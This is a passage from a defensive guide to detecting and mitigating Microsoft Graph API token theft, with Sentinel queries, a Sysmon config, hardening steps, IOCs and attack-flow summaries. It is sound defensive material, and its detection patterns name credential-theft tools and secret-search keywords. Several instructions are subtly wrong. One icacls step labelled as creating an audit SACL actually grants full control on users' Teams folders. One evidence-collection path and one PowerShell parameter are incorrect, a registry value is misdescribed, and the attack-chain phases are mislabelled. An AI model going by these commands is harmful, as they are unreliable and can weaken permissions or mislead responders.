   - Name: `Graph API Credential Exfiltration via Search`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `10 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this rule**
6. Click **Review + create** → **Create**

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "SOC-RG"
$WorkspaceName = "Sentinel-Workspace"

$RuleQuery = @"
MicrosoftGraphActivityLogs
| where RequestUriPath startswith "/search/query" and RequestMethod == "POST"
| extend RequestBody = parse_json(RequestBody)
| where RequestBody.requests[0].query contains "password" 
| summarize SearchCount=count() by UserId
| where SearchCount > 3
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "Graph API Credential Exfiltration" `
  -Query $RuleQuery `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel GitHub - Graph API Threat Detection](https://github.com/Azure/Azure-Sentinel)

---

### Query 2: Token Extraction via Mimikatz / DPAPI in Event Logs

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents
- **Required Fields:** ParentProcessName, ProcessName, CommandLine, EventID
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Windows 10/11, Server 2019-2025 with Defender for Endpoint

**KQL Query:**

```kusto
DeviceProcessEvents
| where ProcessName has "mimikatz" or ProcessName has "procdump"
    or ProcessName has "teams_dump"
    or (CommandLine contains "DPAPI" and CommandLine contains "decrypt")
    or (ProcessName has "powershell" and CommandLine contains "ProtectedData")
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessName, CommandLine
| join kind=inner (
    SecurityEvent
    | where EventID == 4688
    | project TimeGenerated, Computer, NewProcessName, ParentProcessName, CommandLine
    ) on Computer == DeviceName
```

**What This Detects:**
- Process execution of known credential extraction tools (Mimikatz, procdump, teams_dump).
- PowerShell commands using DPAPI APIs (ProtectedData.Unprotect).
- Strong indicator of active token extraction attack.

**Manual Configuration Steps:**

1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General:**
   - Name: `Potential Graph API Token Extraction Attempt`
   - Severity: `Critical`
3. **Set rule logic:**
   - Paste KQL query
   - Run every: `5 minutes`
   - Lookup: `15 minutes`
4. **Incident settings:** Enable incident creation
5. **Create**

---

## 9. WINDOWS EVENT LOG MONITORING

**Event IDs to Monitor:**

### Event ID 4688 (Process Creation)

- **Log Source:** Security
- **Trigger:** Execution of credential theft tools (Mimikatz, procdump, teams_dump).
- **Filter:** CommandLine contains "DPAPI", "mimikatz", "teams_dump", or "ProtectedData".
- **Applies To Versions:** Windows 10/11, Server 2019-2025.

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Detailed Tracking** → **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines
6. Verify: `auditpol /get /subcategory:"Process Creation"` should return "Success and Failure"

### Event ID 4663 (File Access)

- **Log Source:** Security
- **Trigger:** Access to Teams Cookies database file.
- **Filter:** Object Name contains "Teams_8wekyb3d8bbwe" and AccessMask contains "Read".
- **Applies To Versions:** Windows 10/11, Server 2019-2025.

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access** → **Audit File System**
3. Set to: **Success and Failure**
4. Run: `auditpol /set /subcategory:"File System" /success:enable /failure:enable`
5. Create SACL on Teams path: 
   ```cmd
   icacls "C:\Users\*\AppData\Local\Packages\MSTeams_8wekyb3d8bbwe" /grant "*S-1-5-21-*-512:(F)" /T
   ```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Server 2019-2025.

```xml
<!-- Detect DPAPI decryption attempts for Teams token extraction -->
<Sysmon schemaversion="4.1">
  <EventFiltering>
    <!-- Process Execution - Mimikatz or DPAPI-related PowerShell -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">
        mimikatz
        procdump
        teams_dump
        CryptoUnprotect
      </CommandLine>
    </ProcessCreate>
    
    <!-- File Access to Teams Cookies -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">
        MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies
      </TargetFilename>
    </FileCreate>
    
    <!-- Network Connection to Graph API endpoints -->
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">
        graph.microsoft.com
        login.microsoftonline.com
      </DestinationHostname>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with the XML above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** "Anomalous Microsoft Graph activity detected"
- **Severity:** High
- **Description:** Unusual pattern of Graph API calls from the user's account (bulk searches, mailbox access from new IP).
- **Applies To:** All subscriptions with Defender for Endpoint enabled.

**Alert Name:** "Potential credential theft via DPAPI"
- **Severity:** Critical
- **Description:** Execution of credential extraction tools (Mimikatz, teams_dump) on managed endpoint.
- **Applies To:** Windows devices enrolled in Defender for Endpoint.

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Cloud Apps**: ON (monitors Graph API abuse)
   - **Defender for Servers**: ON (monitors credential theft tools)
   - **Defender for Storage**: ON (monitors file access patterns)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud Alert Reference](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Graph API Operations

```powershell
Search-UnifiedAuditLog -Operations "Search-MailboxContent","SearchMailbox" `
    -StartDate (Get-Date).AddDays(-7) `
    -EndDate (Get-Date) `
    -FreeText "password OR admin OR secret OR API_KEY" |
    Export-Csv -Path "C:\AuditLog_GraphAPI.csv"
```

- **Operation:** Search-MailboxContent, SearchMailbox, Get-User, Get-Team
- **Workload:** Exchange, Teams, SharePoint
- **Details:** Analyze AuditData blob for RequestUri, RequestMethod, RequestSize (large downloads indicate exfiltration).
- **Applies To:** M365 E3+

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate
5. Go to **Audit** → **Search**
6. Set **Date range**, select **Activities** (e.g., "Mailbox login", "Search mailbox")
7. Click **Search**
8. Export results: **Export** → **Download all results**

**PowerShell Alternative:**

```powershell
Connect-ExchangeOnline -UserPrincipalName admin@contoso.com
Search-UnifiedAuditLog -StartDate "01/01/2025" -EndDate "01/31/2025" `
    -Operations "Search-MailboxContent" `
    -ResultSize 5000 | Select-Object UserIds, Operations, ResultIndex, AuditData | 
    Export-Csv -Path "C:\GraphAPI_Audit.csv"
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Token Protection (Primary Refresh Token - PRT with Device Bound Keys)**

Token protection ensures tokens are bound to a specific device, making stolen tokens unusable on different systems.

**Applies To Versions:** Windows 10+, Server 2022+ with Entra ID

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Enforce Token Protection for Graph API`
4. **Assignments:**
   - Users: **All users** (or specific high-risk groups)
   - Cloud apps: **Microsoft Graph API**, **Office 365 Exchange Online**
5. **Conditions:**
   - Device state: **Any**
   - Client apps: **All clients**
6. **Access controls:**
   - Grant: **Require device to be marked as compliant**
   - Grant: **Require authentication strength** → **Passwordless sign-in (Windows Hello, FIDO2)**
7. Enable policy: **On**
8. Click **Create**

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

$policyDisplayName = "Enforce Token Protection for Graph API"
$policyDescription = "Require Primary Refresh Token binding to device"

$conditionalAccessPolicy = @{
    displayName = $policyDisplayName
    state = "enabledForReportingButNotEnforced"
    conditions = @{
        applications = @{
            includeApplications = @("00000003-0000-0000-c000-000000000000") # Microsoft Graph
        }
        users = @{
            includeUsers = @("All")
        }
    }
    grantControls = @{
        operator = "AND"
        builtInControls = @(
            "compliantDevice",
            "approvedClientApp"
        )
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $conditionalAccessPolicy
```

**Validation Command (Verify Fix):**

```powershell
Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Enforce Token Protection'" |
    Select-Object DisplayName, State, CreatedDateTime
```

**Expected Output (If Secure):**
```
DisplayName                              State                        CreatedDateTime
-------------------------------          -----------------------      ---------------
Enforce Token Protection for Graph API   enabledForReportingButNotE... 1/8/2025 4:15 AM
```

---

**2. Revoke Refresh Tokens Tenant-Wide (Break Existing Compromised Sessions)**

Refresh token revocation forces all users to re-authenticate, invalidating stolen tokens.

**Applies To Versions:** All Entra ID tenants

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Users** → Select **High-Risk Users**
2. Click **Confirm compromised**
3. This immediately revokes all refresh tokens for that user
4. User must re-authenticate on next access

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "User.ReadWrite.All"

# Get the compromised user
$user = Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'"

# Revoke all refresh tokens (force re-authentication)
Revoke-MgUserSignInSession -UserId $user.Id

Write-Host "[+] All refresh tokens revoked for $($user.UserPrincipalName)"
```

**Validation Command:**

```powershell
# Verify that the user must re-authenticate on next access
Get-MgUserSignInActivity -UserId (Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'").Id |
    Select-Object SignInDateTime, IsRisky
```

---

**3. Disable Legacy OAuth Clients & Require Modern Authentication**

Legacy OAuth clients (pre-2015 apps) do not support token protection or conditional access policies.

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications**
2. Click **Application registration** → **All applications**
3. Filter for apps with creation date > 10 years ago
4. For each legacy app:
   - Click **Properties** → **Enabled for users to sign in?** → **No**
   - Click **Delete** to remove if no longer needed

**Manual Steps (PowerShell):**

```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Get all legacy OAuth apps (created before 2015)
$legacyApps = Get-MgApplication -Filter "createdDateTime lt 2015-01-01T00:00:00Z"

foreach ($app in $legacyApps) {
    Write-Host "Disabling legacy app: $($app.DisplayName)"
    Update-MgApplication -ApplicationId $app.Id -AccountEnabled $false
}
```

---

**4. Enable Microsoft Graph API Diagnostics & Auditing**

Ensure all Graph API calls are logged for detection and forensics.

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. **Name:** `Graph API Activity Logging`
4. **Logs:** Enable `MicrosoftGraphActivityLogs` and `AzureADGraphActivityLogs`
5. **Destination:** Send to **Log Analytics workspace**
6. Click **Save**

**Manual Steps (PowerShell):**

```powershell
Connect-AzAccount
$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName "SOC-RG" -Name "Sentinel-Workspace"

New-AzDiagnosticSetting -Name "Graph API Activity Logging" `
    -ResourceId "/subscriptions/{subscriptionId}/providers/Microsoft.aadiam/diagnosticSettings" `
    -WorkspaceId $workspace.ResourceId `
    -Enabled $true `
    -Categories "MicrosoftGraphActivityLogs","AzureADGraphActivityLogs"
```

---

### Priority 2: HIGH

**5. Implement Least Privilege Access for Service Principals & App Registrations**

Service principals and application registrations with Mail.Read.All or User.Read.All scopes are high-value targets.

**Manual Steps:**

1. Go to **Azure Portal** → **Entra ID** → **App registrations**
2. For each app:
   - Click **API permissions**
   - Remove broad scopes (Mail.Read.All, User.Read.All) and replace with delegated scopes (Mail.Read, User.Read)
   - Revoke admin consent if not essential

---

**6. Block Graph API Access from Non-Compliant or Untrusted IP Ranges**

Restrict Graph API calls to known corporate IP ranges.

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **Named locations**
2. Click **+ New location**
3. **Name:** `Corporate IP Ranges`
4. **IP ranges:** Enter CIDR ranges (e.g., 203.0.113.0/24)
5. Click **Create**
6. Create a new Conditional Access policy:
   - Exclude Graph API access from named location
   - Require re-authentication for out-of-location access

---

**7. Enable Teams Desktop Client Notification on Token Export Attempts**

Configure Teams to alert users when tokens are being exported.

**Manual Steps (PowerShell - Teams Admin):**

```powershell
# This is not directly configurable but can be mitigated with app-bound encryption
# Recommend using web-based Teams instead of desktop client to avoid DPAPI-encrypted token storage
```

---

### Access Control & Policy Hardening

**Conditional Access Policies:**

1. **Require Compliant Device:** Require Windows Defender enabled, Windows Firewall on
2. **Block Legacy Authentication:** Disable support for SMTP, IMAP, POP3 (older protocols without MFA support)
3. **Token Lifetime Policy:** Shorten token lifetimes (default 1 hour for access token; reduce to 15 minutes for high-risk users)
4. **IP Risk-Based Policies:** Block access from high-risk countries/IP ranges

**RBAC/ABAC Hardening:**

1. Remove users from **Global Administrator** role; use role-based access (Exchange Admin, Teams Admin, etc.)
2. Implement **Privileged Identity Management (PIM)** requiring approval for sensitive roles
3. Use **Azure Lighthouse** for delegated access instead of direct role assignment

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Users\*\AppData\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies` (Teams token cache)
- `C:\Windows\Temp\Teams_Cookies*` (copied Cookies database)
- `C:\Users\*\AppData\Roaming\AADInternals\*` (AADInternals cache)

**Registry:**
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\DCacheMinimumAgeSeconds` (Teams token cache age)

**Network:**
- Connections to `graph.microsoft.com:443` from non-standard ports or external proxies
- Connections to `login.microsoftonline.com` with unusual User-Agent strings (Evilginx2)
- Large outbound data transfers to attacker-controlled domain (token exfiltration)

### Forensic Artifacts

**Disk:**
- Event ID 4688 (Process Creation) logs showing `mimikatz`, `procdump`, `powershell` with DPAPI commands
- Event ID 4663 (File Access) showing access to Teams Cookies database
- MFT entries for Teams cookie files with recent modification times

**Memory:**
- LSASS process memory dump containing DPAPI keys
- msedgewebview2.exe process memory containing extracted tokens

**Cloud:**
- MicrosoftGraphActivityLogs entries showing:
  - Bulk search queries (RequestUri contains `/search/query`)
  - Mailbox enumeration (RequestUri contains `/users/*/mailFolders`)
  - OneDrive file downloads (RequestUri contains `/drive/items`)
  - Teams message exfiltration (RequestUri contains `/teams/*/messages`)
- AuditLogs entries showing unusual Graph API app registrations or consent grants

**Entra ID Sign-In Logs:**
- SignInLogs entries showing access from unusual IP addresses
- Entries with successful MFA but followed immediately by token-based API calls (token theft post-MFA)

### Response Procedures

1. **Isolate:**
   - Immediately revoke all refresh tokens for affected user:
     ```powershell
     Revoke-MgUserSignInSession -UserId (Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'").Id
     ```
   - Block user's IP address at firewall (if external attacker)
   - Disconnect affected endpoint from network

2. **Collect Evidence:**
   - Export Security Event Log:
     ```powershell
     wevtutil epl Security C:\Evidence\Security.evtx
     ```
   - Capture Teams Cookies database (if Teams still running):
     ```powershell
     Copy-Item "$env:APPDATA\Local\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Cookies" -Destination "C:\Evidence\"
     ```
   - Export Graph API activity logs:
     ```powershell
     Connect-MgGraph
     Get-MgAuditLogDirectoryAudit -Filter "category eq 'ApplicationManagement'" | Export-Csv "C:\Evidence\AuditLogs.csv"
     ```

3. **Remediate:**
   - Force password reset for affected user
   - Revoke all OAuth app consents (user may need to re-consent to legitimate apps)
   - Review and revoke any new app registrations created by attacker
   - Change service principal credentials if compromised
   - Review all Graph API calls from compromised account for exfiltrated data

4. **Communicate:**
   - Notify user of compromise
   - Assess if any sensitive data was exfiltrated (mailbox, OneDrive, Teams)
   - Coordinate with legal/compliance if GDPR/HIPAA breach notification required

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-PHISH-002] Consent Grant OAuth Attacks | Attacker tricks user into granting OAuth permissions to malicious app |
| **2** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Tokens stolen via Azure AD Connect misconfiguration |
| **3** | **Current Step** | **[CA-TOKEN-004]** | **Graph API Token Theft (this technique)** |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates new admin account or adds persistence to existing account |
| **5** | **Impact** | [CA-UNSC-003] SYSVOL GPP Credential Extraction | Attacker uses elevated Graph API access to enumerate more credentials |
| **6** | **Exfiltration** | [IA-PHISH-005] Internal Spearphishing Campaigns | Attacker sends phishing from compromised user to other employees |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: Storm-2372 Device Code Phishing Campaign (2025)

- **Target:** Financial services companies, government agencies
- **Timeline:** January 2025 (ongoing)
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Attacker sends phishing email with device code ("Please enter this code: ABC123DEF456")
  2. User enters code at microsoft.com/devicelogin
  3. Attacker's polling loop captures access_token + refresh_token
  4. Attacker uses stolen token with Graph API to:
     - Search mailbox for keywords: "username", "password", "admin", "teamviewer", "anydesk", "credentials", "secret", "ministry", "gov"
     - Exfiltrate matching emails via Microsoft Graph
     - Send internal phishing to other employees
  5. Attack results in data breach, lateral movement, full tenant compromise
- **Indicators:** Unusual Graph API search queries, bulk email downloads from non-executive users
- **Reference:** [Microsoft Threat Intelligence - Storm-2372 Campaign](https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/)

### Example 2: Microsoft Teams Token Extraction via DPAPI (October 2025)

- **Target:** Enterprise organizations with Teams desktop client
- **Timeline:** October 2025 (research by Brahim El Fikhi, Randori Security)
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Attacker gains local access (malware, compromised employee device)
  2. Attacker kills Teams process to release Cookies database lock
  3. Attacker extracts encrypted Cookies database and Local State JSON
  4. Attacker decrypts DPAPI master key using user context
  5. Attacker extracts AES-256-GCM decrypted tokens from Cookies
  6. Attacker uses tokens with GraphSpy or GraphRunner to exfiltrate Teams chats, emails, OneDrive files
- **Impact:** Complete access to Teams conversations and email without user awareness; tokens valid for hours
- **Indicators:** Process termination of ms-teams.exe, file copy of Teams Cookies, DPAPI API calls in PowerShell
- **Reference:** [Randori Security - MS Teams Access Token Vulnerability](https://blog.randorisec.fr/ms-teams-access-tokens/)

### Example 3: Evilginx2 MITM OAuth Phishing (Generic, Ongoing)

- **Target:** Any organization using OAuth 2.0 for Microsoft 365
- **Timeline:** Ongoing (tool released 2017, actively used through 2025)
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Attacker sets up Evilginx2 MITM proxy on attacker VPS
  2. Attacker creates phishing domain (e.g., "login-microsoft.com") and DNS records
  3. Attacker sends phishing email with link to Evilginx phishing page
  4. User enters credentials on fake Microsoft login page
  5. Evilginx captures credentials and relays to real Microsoft OAuth endpoint
  6. Evilginx extracts authorization code and exchanges for tokens
  7. Attacker uses access_token + refresh_token with Graph API
- **Impact:** Full access to user's M365 account, including mail, Teams, OneDrive
- **Indicators:** Unusual sign-in from attacker's IP followed by bulk Graph API queries; sign-in event shows successful MFA but from external country
- **Mitigation:** FIDO2 security keys (cannot be phished); Windows Hello for Business (biometric binding)

---

## 17. OPERATIONAL NOTES & ADDITIONAL RECOMMENDATIONS

### Why This Technique Remains ACTIVE:

1. **OAuth 2.0 is a design requirement** - tokens cannot be prevented from being stolen; only detection and remediation are viable
2. **Stolen tokens bypass MFA** - user already authenticated, so MFA challenge does not re-trigger
3. **Token theft is invisible** - API calls appear legitimate (user's own account, valid token)
4. **Refresh tokens extend access indefinitely** - even after user changes password, refresh token remains valid unless explicitly revoked

### Recommended Defensive Posture:

- **Assume tokens will be stolen** and focus on detection (bulk searches, unusual patterns)
- **Implement token protection (PRT binding)** to make stolen tokens unusable on different devices
- **Enforce short-lived tokens** (15 minutes) for high-risk users to minimize token lifetime
- **Monitor Graph API activity continuously** with Sentinel detection rules
- **Enable conditional access policies** requiring device compliance and location validation
- **Use passwordless authentication** (Windows Hello, FIDO2) to eliminate password as attack vector

### Testing & Validation in Red Team Exercises:

1. **Controlled DPAPI extraction test:** Extract Teams tokens in lab environment to verify detection
2. **Synthetic device code phishing:** Send device code flow test to users; measure who completes
3. **Graph API anomaly detection validation:** Run bulk search queries and verify alerting
4. **Token lifetime tuning:** Reduce token lifetime to 15 minutes and measure impact on legitimate workflows

---